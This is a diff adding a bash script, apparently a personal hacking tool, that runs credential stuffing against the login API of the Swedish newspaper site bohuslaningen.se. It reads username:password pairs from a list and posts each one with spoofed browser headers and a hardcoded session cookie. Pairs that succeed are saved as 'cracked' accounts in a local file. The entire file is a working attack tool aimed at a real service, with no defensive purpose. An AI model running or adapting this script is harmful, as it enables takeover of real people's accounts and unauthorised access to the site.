@@ -1,0 +1,64 @@
+#!/bin/bash
+################################################################################
+################################################################################
+####                                                                       #####
+#### A notice to all nerds.                                                #####
+#### If you will copy developers real work it will not make you a hacker.  #####
+#### Resepect all developers, we doing this because it's fun!              #####
+####                                                                       #####
+################################################################################
+################################ SOURCE CODE ###################################
+################################################################################
+####  Copyright (C) 2018-2019, wuseman                                     #####
+####                                                                       #####
+####  This program is free software; you can redistribute it and/or modify #####
+####  it under the terms of the GNU General Public License as published by #####
+####  the Free Software Foundation; either version 2 of the License, or    #####
+####  (at your option) any later version.                                  #####
+####                                                                       #####
+####  This program is distributed in the hope that it will be useful,      #####
+####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
+####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
+####  GNU General Public License for more details.                         #####
+####                                                                       #####
+####  You must obey the GNU General Public License. If you will modify     #####
+####  wspotify file(s), you may extend this exception to your version      #####
+####  of the file(s), but you are not obligated to do so.  If you do not   #####
+####  wish to do so, delete this exception statement from your version.    #####
+####  If you delete this exception statement from all source files in the  #####
+####  program, then also delete it here.                                   #####
+####                                                                       #####
+####  Contact:                                                             #####
+####          IRC: Freenode @ wuseman                                      #####
+####          Mail: wuseman <wuseman@nr1.nu>                               #####
+####                                                                       #####
+################################################################################
+
+if [[ $EUID -ne "0" ]]; then
+   echo "This tool must be executed by root"
+   exit 1
+fi
+
+if [[ ! -d /root/cracked-accounts ]]; then
+   mkdir -p /root/cracked-accounts
+fi
+
+while read line; do
+ BOHUSLANINGEN_USER="$(echo $line|cut -d: -f1)"
+ BOHUSLANINGEN_PASS="$(echo $line|cut -d: -f2)"
+ curl -s 'https://www.bohuslaningen.se/internal-api/user/login' \
+        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' \
+        -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed \
+        -H 'Referer: https://www.bohuslaningen.se/' \
+        -H 'Content-Type: application/json' \
+        -H 'Origin: https://www.bohuslaningen.se' \
+        -H 'Connection: keep-alive' \
+        -H 'Cookie: __cfduid=d405f81016550724f72c4942d3d5bb98b1587522257; lw_id=509fb886-946b-2f26-cfa9-c73fc3280910; stampen-cookies-hide-information=yes; __glmrid=d4be2ac7-ca7f-46e8-8b21-2da548dd77b5; T_ID=%7B%22iat%22%3A1587869409%2C%22nbf%22%3A1587869109%2C%22exp%22%3A1587869709%2C%22session%22%3A%7B%22active%22%3Afalse%7D%2C%22signature%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODc4Njk0MDksIm5iZiI6MTU4Nzg2OTEwOSwiZXhwIjoxNTg3ODY5NzA5LCJzZXNzaW9uIjp7ImFjdGl2ZSI6ZmFsc2V9fQ.VQUfDAQkl62_YUpBsAuIfawXetBR_ebgpwL7sHeyGPM%22%7D; is-app=false' \
+        -H 'DNT: 1' --data "{"username":'$BOHUSLANINGEN_USER',"password":$BOHUSLANINGEN_PASS,'continueUrl':'https://www.bohuslaningen.se/'}"|grep -iq "password do not match"
+           if [[ "$?" -eq "0" ]]; then
+              echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${BOHUSLANINGEN_USER}:${BOHUSLANINGEN_PASS}"
+           else
+              echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${BOHUSLANINGEN_USER}:${BOHUSLANINGEN_PASS}" 
+              echo -e "${BOHUSLANINGEN_USER}:${BOHUSLANINGEN_PASS}" >> ~/cracked-accounts/cracked-bohuslaningen-accounts.txt
+           fi
+done < $1
